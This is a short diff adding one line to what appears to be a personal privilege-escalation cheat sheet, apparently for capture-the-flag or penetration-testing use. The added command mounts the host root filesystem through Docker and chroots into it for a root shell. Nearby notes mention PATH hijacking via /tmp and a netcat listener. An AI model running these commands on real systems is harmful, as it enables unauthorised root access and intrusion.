@@ -37,6 +37,8 @@ export PATH=/tmp/folder:$PATH
 start netcat listener on your port number
 sysinfo - for root
 
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
 sudo -l
 see what commands you can run
 
